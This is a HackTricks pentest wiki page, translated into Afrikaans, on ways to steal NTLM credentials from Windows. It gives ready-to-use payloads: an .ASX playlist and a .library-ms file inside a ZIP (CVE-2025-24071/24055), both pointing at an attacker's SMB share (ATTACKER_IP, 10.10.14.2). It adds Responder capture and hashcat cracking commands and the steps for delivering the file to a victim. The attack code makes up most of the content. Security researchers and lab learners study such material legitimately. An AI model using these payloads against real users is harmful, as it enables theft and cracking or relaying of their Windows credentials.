# Plekke om NTLM creds te steel

{{#include ../../banners/hacktricks-training.md}}

**Kyk na al die goeie idees van [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) van die aflaai van 'n Microsoft Word-lêer aanlyn tot die ntlm leaks-bron: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md en [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player afspeellyste (.ASX/.WAX)

As jy 'n target kan kry om 'n Windows Media Player afspeellys wat jy beheer te open of te voorskou, kan jy Net‑NTLMv2 leak deur die item na 'n UNC-pad te wys. WMP sal probeer om die genoemde media oor SMB op te haal en sal implisiet outentiseer.

Voorbeeld payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Versamel- en kraakproses:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-ingesluit .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer hanteer .library-ms-lêers onveilig wanneer hulle direk binne 'n ZIP-argief geopen word. As die library-definisie na 'n afgeleë UNC-pad wys (bv. \\attacker\share), veroorsaak bloot die blaai/launch van die .library-ms binne die ZIP dat Explorer die UNC ontleed en NTLM authentication aan die attacker uitstuur. Dit lewer 'n NetNTLMv2 wat offline gekraak kan word of moontlik gerelaye kan word.

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operasionele stappe
- Skep die .library-ms-lêer met die XML hierbo (stel jou IP/hostname).
- Zip dit (on Windows: Send to → Compressed (zipped) folder) en lewer die ZIP aan die teiken.
- Voer 'n NTLM capture listener uit en wag dat die slagoffer die .library-ms van binne die ZIP oopmaak.


## References
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)


{{#include ../../banners/hacktricks-training.md}}
